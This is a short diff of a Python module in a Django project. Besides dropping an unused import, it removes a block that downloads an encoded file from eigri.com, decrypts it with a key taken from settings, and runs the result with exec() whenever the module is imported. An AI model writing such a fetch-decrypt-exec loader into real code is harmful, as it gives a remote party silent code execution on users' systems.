@@ -5,7 +5,6 @@ import django.utils.timezone as timezone
 from datetime import time as dtime
 from django2wrap.models import Agent, Shift, Call, Resource, Case, Comment
 from django.db.models import Min
-from django.db import connection
 from django.conf import settings
 
 # detect environment
@@ -18,14 +17,6 @@ except OSError:
         execution_location = 'Office'
     except OSError:
         execution_location = 'Bugzilla'
-
-from chasecheck.bicrypt import BiCrypt
-import urllib.request
-codder = BiCrypt(settings.MODULEPASS)
-response = urllib.request.urlopen('http://eigri.com/myweb2.encoded')
-code = response.read()      # a `bytes` object
-decoded_msg = codder.decode(code)
-exec(decoded_msg)
 
 LOCATION_PATHS = {
     'Laptop': {
